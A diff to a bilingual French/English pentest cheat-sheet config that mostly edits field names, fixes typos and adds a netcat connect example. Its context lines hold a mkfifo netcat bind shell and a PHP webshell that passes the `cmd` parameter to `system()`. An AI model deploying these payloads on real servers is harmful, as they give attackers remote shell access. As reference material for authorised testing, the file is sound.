@@ -12,7 +12,7 @@ Lignes de code à injecter dans des pages web pour lancer des commandes shell.
 
 
 [principle]
-id=nc
+id=ncprinciple
 category=Webshell
 keywords=
 title=Principe
@@ -48,6 +48,9 @@ Sur Kali on trouve une version 1.10 en :
 	-v                : verbose
 	-p port           : local port number
 </code></pre>
+Pour se connecter sur le port 3000 du serveur 10.0.0.11:
+<pre><code>/usr/bin/nc 10.0.0.11 3000
+</code></pre>
 "
 title_en=Netcat
 desc_en="
@@ -62,6 +65,9 @@ On Kali there is a version 1.10 in :
 	-l                : listen mode
 	-v                : verbose
 	-p port           : local port number
+</code></pre>
+Connect to port 3000 on 10.0.0.11 server:
+<pre><code>/usr/bin/nc 10.0.0.11 3000
 </code></pre>
 "
 
@@ -246,8 +252,8 @@ Se connecter avec un nc
 </code></pre>
 "
 title="Netcat - Bind Shell (without -e option)"
-desc="
-Launch a bind shel on the target host
+desc_en="
+Launch a bind shell on the target host
 <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
 </code></pre>
 Then connect to it
@@ -419,7 +425,7 @@ Lancer la commande 'id' sur le server
 </code></pre>
 "
 title=Web server: cmd.php
-desc="
+desc_en="
 If you can upload a php file to the web server, the file below will allow you to run shell commands:
 <pre><code>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>
 </code></pre>
@@ -443,7 +449,7 @@ Lancer la commande 'id' sur le server
 </code></pre>
 "
 title="Web server: cmd.php (clean html)"
-desc="
+desc_en="
 Upload the file
 <pre><code>&ltpre>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>&lt/pre>
 </code></pre>
